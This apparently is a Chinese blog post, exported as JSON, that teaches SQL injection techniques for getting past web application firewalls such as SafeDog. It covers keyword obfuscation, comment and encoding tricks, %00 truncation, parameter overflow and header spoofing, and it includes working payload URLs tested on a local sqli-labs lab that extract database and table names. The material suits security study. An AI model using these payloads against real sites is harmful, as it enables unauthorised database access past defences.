{"title":"SQL注入-绕过WAF","uid":"e80d729249f46c80b287eec83a7a4367","slug":"SQL注入-绕过WAF","date":"2022-02-11T15:37:25.000Z","updated":"2022-02-13T15:45:57.047Z","comments":true,"path":"api/articles/SQL注入-绕过WAF.json","keywords":null,"cover":[],"content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>[TOC]</p>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>由于网站会部署WAF，例如安全狗，宝塔等，各自有各自的WAF策略规则，因此，绕过的方法也不同。了解其最基本的WAF规则便可进行对其绕过。</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87WAF.htm/image-20220212223455557.png\" alt=\"image-20220212223455557\"></p>\n<h2 id=\"WAF绕过姿势\"><a href=\"#WAF绕过姿势\" class=\"headerlink\" title=\"WAF绕过姿势\"></a>WAF绕过姿势</h2><p>1、大小写&#x2F;关键字的替换：</p>\n<p>i<code>d=1 UnIoN/**/SeLeCT 1,user()</code></p>\n<p><code>Hex() bin() 等价于 ascii()</code> </p>\n<p><code>Sleep() 等价于 benchmark()</code> </p>\n<p><code>Mid()substring() 等价于 substr()</code> </p>\n<p><code>@@user 等价于 User()</code> </p>\n<p><code>@@Version 等价于 version()</code></p>\n<p>2、各种编码：</p>\n<p>url，utf-8，utf-16，utf-32，hex等</p>\n<p>3、双写绕过：</p>\n<p>ununionion，selselectect，oorr，aandnandd等</p>\n<p>4、HTTP参数污染（HPP）：</p>\n<p>?id&#x3D;1&amp;id&#x3D;2&amp;id&#x3D;3</p>\n<p>5、编码的加密与解密：<br>hex，unlcode，base64等</p>\n<p>6、更改请求方式：</p>\n<p>GET，POST，COOKIE或数据包里的各种关键字等</p>\n<p>7、内联注释：</p>\n<p><code>/*!UnIon12345SelEcT*/ 1,user()</code> </p>\n<p><strong>8、FUZZ大法</strong></p>\n<p>9、<code>%20/*!44509union*/%23x%0aselect%201,2,3</code>只基于Mysql数据库的<strong>版本号绕过</strong></p>\n<h2 id=\"逻辑层的绕过\"><a href=\"#逻辑层的绕过\" class=\"headerlink\" title=\"逻辑层的绕过\"></a>逻辑层的绕过</h2><p>1、逻辑问题</p>\n<p>（1）云 waf 防护，一般我们会尝试通过查找站点的真实 IP，从而绕过 CDN 防护。 </p>\n<p>（2）当提交GET、POST同时请求时，进入POST逻辑，而忽略了GET请求的有害参数输</p>\n<p>​          入,可尝试Bypass。 </p>\n<p>（3）HTTP 和 HTTPS 同时开放服务，没有做 HTTP 到 HTTPS 的强制跳转，导致HTTPS     有 WAF 防护，HTTP 没有防护，直接访问 HTTP 站点绕过防护。 </p>\n<p>（4）特殊符号<code>%00</code>，部分 waf 遇到<code>%00</code> 截断，只能获取到前面的参数，无法获取到后面的有害参数 输 入 ， 从 而 导 致 Bypass 。 比 如 ： <code>id=1%00and 1=2 union select 1,2,column_name from information_schema.columns</code></p>\n<p>2、性能问题</p>\n<p><strong>猜想 1</strong>：在设计 WAF 系统时，考虑自身性能问题，当数据量达到一定层级，不检测这部分数据。只 要不断的填充数据，当数据达到一定数目之后，恶意代码就不会被检测了。</p>\n<p>例：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">?id<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token operator\">and</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">Select</span> <span class=\"token number\">0xA</span><span class=\"token operator\">*</span><span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token keyword\">UnIoN</span><span class=\"token operator\">+</span><span class=\"token keyword\">SeLeCT</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>version<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token number\">9</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p> PS：0xA*1000 指 0xA 后面”A”重复 1000 次，一般来说对应用软件构成缓冲区溢出都需要较大的测试 长度，这里 1000 只做参考也许在有些情况下可能不需要这么长也能溢出。</p>\n<p><strong>猜想 2</strong>：不少 WAF 是 C 语言写的，而 C 语言自身没有缓冲区保护机制，因此如果 WAF 在处理测试向 量时超出了其缓冲区长度就会引发 bug，从而实现绕过。</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">?a0<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token operator\">&amp;</span>a1<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">&amp;</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token operator\">&amp;</span>a100<span class=\"token operator\">=</span><span class=\"token number\">100</span><span class=\"token operator\">&amp;</span>id<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>schema_name<span class=\"token punctuation\">,</span><span class=\"token number\">3</span> <span class=\"token keyword\">from</span>\nINFORMATION_SCHEMA<span class=\"token punctuation\">.</span>schemata<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>备注：获取请求参数，只获取前 100 个参数，第 101 个参数并没有获取到，导致 SQL 注入绕过。</p>\n<p>3、白名单</p>\n<p>方式一：IP 白名单 从网络层获取的 ip，这种一般伪造不来，如果是获取客户端的 IP，这样就可能存在伪造 IP 绕过的情 况。 </p>\n<p>测试方法：修改 http 的 header 来 bypass waf </p>\n<p>X-forwarded-for </p>\n<p>X-remote-IP </p>\n<p>X-originating-IP </p>\n<p>X-remote-addr </p>\n<p>X-Real-ip</p>\n<p>方式二：静态资源 </p>\n<p>特定的静态资源后缀请求，常见的静态文件(.js .jpg .swf .css 等等)，类似白名单机制，waf 为了检测效率，不去检测这样一些静态文件名后缀的请求。</p>\n<p> <a href=\"http://x.x.x.x/sql.php/?id=1\">http://x.x.x.x/sql.php/?id=1</a></p>\n<p> <a href=\"http://x.x.x.x/sql.php/1.js?id=1\">http://x.x.x.x/sql.php/1.js?id=1</a> </p>\n<p>备注：Aspx&#x2F;php 只识别到前面的.aspx&#x2F;.php 后面基本不识别</p>\n<p>方式三：url 白名单 为了防止误拦，部分 waf 内置默认的白名单列表，如 admin&#x2F;manager&#x2F;system 等管理后台。只要 url 中存在白名单的字符串，就作为白名单不进行检测。</p>\n<p>方式四：爬虫白名单</p>\n<p>部分WAF有提供爬虫白名单的功能，识别爬虫的技术一般有两种：<br>1、根据UserAgent                      2、通过行为来判断</p>\n<h2 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h2><p>对于安全狗来说，它在进行防护的时候会对关键字进行拦截，比如<code>union select</code>字段，它会把<code>union select</code>字段当成一个整体进行拦截，若对其从中间加干扰字符可进行对其绕过，对于<code>database()</code>字段，同样也是整体拦截，将<code>database</code>与<code>()</code>进行字符干扰等方法可将其绕过。</p>\n<p>其实最关键的是了解其拦截的方式，对其进行分析（抓包），针对其拦截的方式去写脚本进行注入（<strong>FUZZ大法</strong>）</p>\n<h2 id=\"本地测试\"><a href=\"#本地测试\" class=\"headerlink\" title=\"本地测试\"></a>本地测试</h2><p>以网站安全狗为例：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-2&#x2F;?id&#x3D;-1 union select 1,2,3 --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>可以看到当进行联合注入的时候WAF对攻击进行了拦截</p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87WAF.htm/image-20220213140044011.png\" alt=\"image-20220213140044011\"></p>\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87WAF.htm/image-20220213140143847.png\" alt=\"image-20220213140143847\"></p>\n<p>而当只进行<code>union</code>或<code>select</code>单个字段进行查询时网站会报正常：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-2&#x2F;?id&#x3D;-1 union&#x2F;select  1,2,3 --+<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/SQL%E6%B3%A8%E5%85%A5-%E7%BB%95%E8%BF%87WAF.htm/image-20220213140253672.png\" alt=\"image-20220213140253672\"></p>\n<p>说明安全狗只对<code>union select</code>两个字段在一起查询时才会拦截，这时只要将这两个字段进行干扰，使安全狗检测的时候认为它们不在一起便可进行成功注入。</p>\n<p><strong>拦截order by</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;2&#39; order&#x2F;*&#x2F;*&#x2F;by 3%23\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order&#x2F;*&#x2F;&#x2F;------&#x2F;*&#x2F;by 3%23\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;3&#39; order&#x2F;*&#x2F;&#x2F;------&#x2F;*&#x2F;%23%0aby 3%23<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>拦截union select</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union&#x2F;*&#x2F;%23%23-----------A&#x2F;*&#x2F;select 1,2,3 %23\n\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union&#x2F;*&#x2F;%23%23--&#x2F;%23%23*&#x2F;select 1,2,3 %23\n\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union&#x2F;*&#x2F;%23%23--+&#x2F;%23%23*&#x2F;select 1,2,3 %23<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>**拦截database()<strong>【</strong>也适用于拦截user()**】</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union&#x2F;*&#x2F;%23--%23*&#x2F;select 1,2,database&#x2F;*&#x2F;--+A*&#x2F;() %23\n\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union&#x2F;*&#x2F;%23--%23*&#x2F;select 1,2,database&#x2F;*&#x2F;*!&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;A*&#x2F;() %23\n\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union&#x2F;*&#x2F;%23--%23*&#x2F;select 1,3,database&#x2F;*&#x2F;*!&lt;&gt;&lt;&gt;A*&#x2F;() %23<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>拦截from</strong>（<code>%0a</code>：换行符）</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union&#x2F;*&#x2F;%23--%23*&#x2F;select 1,3,group_concat(table_name)  &#x2F;*!%23%0afrom*&#x2F; information_schema.tables where table_schema&#x3D;&#39;security&#39;%23\n\nhttp:&#x2F;&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union&#x2F;*&#x2F;%23--%23*&#x2F;select 1,3,group_concat(table_name) &#x2F;*!%0afrom*&#x2F; information_schema.tables where table_schema&#x3D;&#39;security&#39;%23<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>这里最重要的还是原理，使用Fuzz大法成功几率会大大增加，改天试试Fuzz大法</strong></p>\n<p>附一篇博主的过狗文章：（主要学习思路和方法）<br>原文链接：<a href=\"https://blog.csdn.net/weixin_43623271/article/details/122814962\">https://blog.csdn.net/weixin_43623271/article/details/122814962</a></p>\n<h2 id=\"00截断原理\"><a href=\"#00截断原理\" class=\"headerlink\" title=\"00截断原理\"></a>00截断原理</h2><p>这里说明一下00截断原理：</p>\n<p>0x00是十六进制表示方法，是ascii码为0的字符，在有些函数处理时，会把这个字符当做结束符。系统在对文件名的读取时，如果遇到0x00，就会认为读取已结束。这个可以用在对文件类型名的绕过上。</p>\n<p>但要注意是文件的16进制内容里的00，而不是文件名中的00 ！！！就是说系统是按16进制读取文件（或者说二进制），</p>\n<p>遇到ascii码为零的位置就停止，而这个ascii码为零的位置在16进制中是00，用0x开头表示16进制，也就是所说的0x00截断。</p>\n<p><strong>%00是被服务器解码为0x00发挥了截断作用。</strong></p>\n","text":"[TOC] 前言由于网站会部署WAF，例如安全狗，宝塔等，各自有各自的WAF策略规则，因此，绕过的方法也不同。了解其最基本的WAF规则便可进行对其绕过。 WAF绕过姿势1、大小写&#x2F;关键字的替换： id=1 UnIoN/**/SeLeCT 1,user() Hex() b...","link":"","photos":[],"count_time":{"symbolsCount":"4.8k","symbolsTime":"4 mins."},"categories":[{"name":"SQL注入","slug":"SQL注入","count":20,"path":"api/categories/SQL注入.json"}],"tags":[{"name":"SQL注入","slug":"SQL注入","count":21,"path":"api/tags/SQL注入.json"},{"name":"Bypass WAF","slug":"Bypass-WAF","count":7,"path":"api/tags/Bypass-WAF.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%89%8D%E8%A8%80\"><span class=\"toc-text\">前言</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#WAF%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF\"><span class=\"toc-text\">WAF绕过姿势</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%80%BB%E8%BE%91%E5%B1%82%E7%9A%84%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">逻辑层的绕过</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%85%B6%E4%BB%96\"><span class=\"toc-text\">其他</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%9C%AC%E5%9C%B0%E6%B5%8B%E8%AF%95\"><span class=\"toc-text\">本地测试</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#00%E6%88%AA%E6%96%AD%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">00截断原理</span></a></li></ol>","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"文件上传基础","uid":"d7d77bc82bafbf7e1e25394ce17aed92","slug":"文件上传基础","date":"2022-02-12T15:02:42.000Z","updated":"2022-02-13T16:20:08.511Z","comments":true,"path":"api/articles/文件上传基础.json","keywords":null,"cover":[],"text":"[TOC] 前言相比于SQL注入等其他漏洞，文件上传漏洞风险更大，最直接的情况则是上传一个webshell拿权限。 文件上传分类： 了解到是文件上传漏洞时，要清楚是什么类型的文件上传漏洞，之后进行下一步操作。 ##文件上传漏洞原理： 网站Web应用都有一些文件上传功能，比如文档、...","link":"","photos":[],"count_time":{"symbolsCount":"1.6k","symbolsTime":"1 mins."},"categories":[{"name":"文件上传","slug":"文件上传","count":5,"path":"api/categories/文件上传.json"}],"tags":[{"name":"文件上传","slug":"文件上传","count":7,"path":"api/tags/文件上传.json"},{"name":"基础知识","slug":"基础知识","count":12,"path":"api/tags/基础知识.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"SQL注入-堆叠注入","uid":"a92a2310a2f65e102da5b7c1e7626f1d","slug":"SQL注入-堆叠注入","date":"2022-02-10T09:06:24.000Z","updated":"2022-02-13T15:45:30.445Z","comments":true,"path":"api/articles/SQL注入-堆叠注入.json","keywords":null,"cover":[],"text":"[TOC] 堆叠注入原理在 SQL 中，分号（;）是用来表示一条 sql 语句的结束。试想一下我们在 ; 结束一个 sql 语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而 union injection（联合注入）也是将两条语句合并在一起，两者之间有...","link":"","photos":[],"count_time":{"symbolsCount":287,"symbolsTime":"1 mins."},"categories":[{"name":"SQL注入","slug":"SQL注入","count":20,"path":"api/categories/SQL注入.json"}],"tags":[{"name":"SQL注入","slug":"SQL注入","count":21,"path":"api/tags/SQL注入.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}